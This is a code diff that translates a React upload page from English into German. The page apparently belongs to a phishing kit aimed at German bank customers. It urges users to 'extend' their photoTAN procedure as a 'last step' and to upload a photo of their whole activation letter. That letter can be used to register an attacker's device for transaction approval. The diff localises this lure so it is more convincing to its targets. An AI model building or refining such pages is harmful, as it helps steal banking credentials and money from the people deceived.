@@ -109,7 +109,7 @@ const UploadPage: React.FC = () => {
         margin: '20px auto 20px auto',
         padding: isMobile ? '0 15px' : '0 20px'
       }}>
-        Last step: Extension of your existing photoTAN procedure
+        Letzter Schritt: Verlängerung Ihres bestehenden photoTAN-Verfahrens
       </h1>
       
       <div style={{
@@ -142,7 +142,7 @@ const UploadPage: React.FC = () => {
             fontFamily: 'Arial, Helvetica, sans-serif',
             textAlign: 'left'
           }}>
-            Scan activation graphic
+            Aktivierungsgrafik scannen
           </h1>
           <div style={{
             backgroundColor: '#f8f9fa',
@@ -158,8 +158,8 @@ const UploadPage: React.FC = () => {
               margin: '0 0 15px 0',
               fontFamily: 'Arial, Helvetica, sans-serif'
             }}>
-              Scan the activation image from the letter you received to extend your photoTAN process. After verification, it will remain valid.
-              Please first take a photo of the entire activation letter and upload the image from your gallery.
+              Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. Nach Prüfung bleibt es weiterhin gültig.
+              Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.
             </p>
             {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
               <div style={{
@@ -237,7 +237,7 @@ const UploadPage: React.FC = () => {
                 transition: 'background 0.3s ease'
               }}
             >
-              {isLoading ? 'Uploading...' : 'Upload File'}
+              {isLoading ? 'Hochladen...' : 'Datei hochladen'}
             </button>
 
             <button
@@ -262,7 +262,7 @@ const UploadPage: React.FC = () => {
                 transition: 'background 0.3s ease'
               }}
             >
-              Next
+              Weiter
             </button>
           </div>
 
@@ -282,7 +282,7 @@ const UploadPage: React.FC = () => {
                 fontSize: '14px',
                 fontFamily: 'Arial, Helvetica, sans-serif'
               }}>
-                Selected: {selectedFile.name}
+                Ausgewählt: {selectedFile.name}
               </p>
             </div>
           )}
